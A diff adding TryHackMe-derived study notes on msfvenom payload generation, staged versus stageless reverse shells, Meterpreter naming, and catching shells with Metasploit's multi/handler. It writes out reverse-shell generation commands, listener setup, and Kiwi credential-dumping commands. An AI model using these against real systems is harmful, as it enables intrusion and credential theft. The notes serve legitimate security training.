@@ -346,6 +346,88 @@ Python
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
 
 All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+From: https://tryhackme.com/room/introtoshells ; Task 9 [with some edits and rephrasing]
+
+msfvenom
+--------
+Msfvenom: the one-stop-shop for all things payload related.
+
+Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py) ... the following information will be a brief introduction to the concepts that will prove useful ...
+
+The standard syntax for msfvenom is as follows:
+
+msfvenom -p <PAYLOAD> <OPTIONS>
+
+For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
+
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+
+Here we are using a payload and four options:
+-f <format>
+Specifies the output format. In this case that is an executable (exe)
+-o <file>
+The output location and filename for the generated payload.
+LHOST=<IP>
+Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
+LPORT=<port>
+The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
+
+Staged vs Stageless
+
+Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
+
+Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
+Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
+Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.
+
+Meterpreter
+
+On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they must be caught in Metasploit.
+
+Payload Naming Conventions
+
+When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
+
+<OS>/<arch>/<payload>
+
+For example:
+
+linux/x86/shell_reverse_tcp
+
+This would generate a stageless reverse shell for an x86 Linux target.
+
+The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
+
+windows/shell_reverse_tcp
+
+For a 64bit Windows target, the arch would be specified as normal (x64).
+
+Let's break the payload section down a little further.
+
+In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
+
+shell/reverse_tcp
+
+As staged payloads are denoted with another forward slash (/).
+
+This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
+
+windows/x64/meterpreter/reverse_tcp
+
+A Linux 32bit stageless Meterpreter payload would look like this:
+
+linux/x86/meterpreter_reverse_tcp
+
+Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:
+
+msfvenom --list payloads
+
+This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads, e.g.:
+msfvenom --list payloads | grep "linux/x86/meterpreter"
+This gives us a full set of Linux meterpreter payloads for 32bit targets.
+
 ------------------------------------------------------------------------------------------------------------------
 Metasploit: Meterpreter
 ------------------------
@@ -596,3 +678,43 @@ Kiwi Commands
     password_change        Change the password/hash of a user
     wifi_list              List wifi profiles/creds for the current user
     wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+From: https://tryhackme.com/room/introtoshells ; Task 10 [with some edits and rephrasing]
+
+Metasploit multi/handler
+------------------------
+Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.
+
+Fortunately, it's relatively easy to use:
+
+Open Metasploit with:
+
+msfconsole
+
+Type:
+
+use multi/handler
+
+and press enter
+We are now primed to start a multi/handler session. [You can now] take a look at the available options using the options command.
+
+There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with ... We set these options with the following commands:
+
+set PAYLOAD <payload>
+set LHOST <listen-address>
+set LPORT <listen-port>
+
+We should now be ready to start the listener!
+
+Let's do this by using the
+exploit -j
+command. This tells Metasploit to launch the module, running as a job in the background.
+
+[Note: to have Metasploit listen] on a port under 1024 ... Metasploit must be run with sudo permissions.
+
+When the staged payload [discussed in Task 9] is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell.
+
+Notice that, because the multi/handler was originally backgrounded, we needed to use:
+sessions 1
+to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions <number> to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "Command Shell session 1 opened").
